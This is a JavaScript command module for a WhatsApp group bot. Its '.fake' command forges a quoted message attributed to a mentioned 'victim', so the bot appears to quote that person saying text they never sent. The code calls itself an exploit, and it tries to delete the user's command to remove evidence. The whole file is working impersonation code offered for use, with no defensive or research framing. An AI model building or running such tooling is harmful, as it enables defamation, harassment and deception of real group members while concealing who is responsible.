export default {
    name: 'suplantacion_cita',
    match: (text) => /^\.fake\s+/i.test(text),
    execute: async ({ sock, remitente, msg, textoLimpio }) => {
        
        const isGroup = remitente.endsWith('@g.us');
        if (!isGroup) {
            return sock.sendMessage(remitente, { text: "❌ Este exploit solo tiene sentido en grupos." }, { quoted: msg });
        }

        const mentionedJid = msg.message.extendedTextMessage?.contextInfo?.mentionedJid?.[0];
        if (!mentionedJid) {
            return sock.sendMessage(remitente, { text: "❌ Tienes que mencionar a la víctima. Ej: .fake @usuario texto" });
        }

        const textoFalso = textoLimpio.replace(/^\.fake\s+/i, '').replace(/@\d+/g, '').trim();
        
        if (!textoFalso) {
            return sock.sendMessage(remitente, { text: "❌ Escribe el texto que quieres falsificar." });
        }

        try {
            // 1. Borramos el comando del usuario para eliminar la evidencia
            // Nota: El bot intentará borrarlo. Si no tiene permisos, simplemente lo ignorará y seguirá.
            try {
                await sock.sendMessage(remitente, { delete: msg.key });
            } catch (e) {
                console.log("[INFO] No se pudo borrar el comando (falta admin).");
            }

            // 2. Construcción del exploit
            const mensajeInyectado = {
                key: {
                    fromMe: false,
                    participant: mentionedJid,
                    id: "3EB0" + Date.now().toString(16).toUpperCase()
                },
                message: {
                    conversation: textoFalso
                }
            };

            // 3. El bot responde con la cita falsa
            await sock.sendMessage(remitente, { 
                text: "como?" 
            }, { 
                quoted: mensajeInyectado 
            });

        } catch (err) {
            console.error("Error Fake Quote:", err);
            await sock.sendMessage(remitente, { text: `❌ Fallo de inyección: ${err.message}` });
        }
    }
};
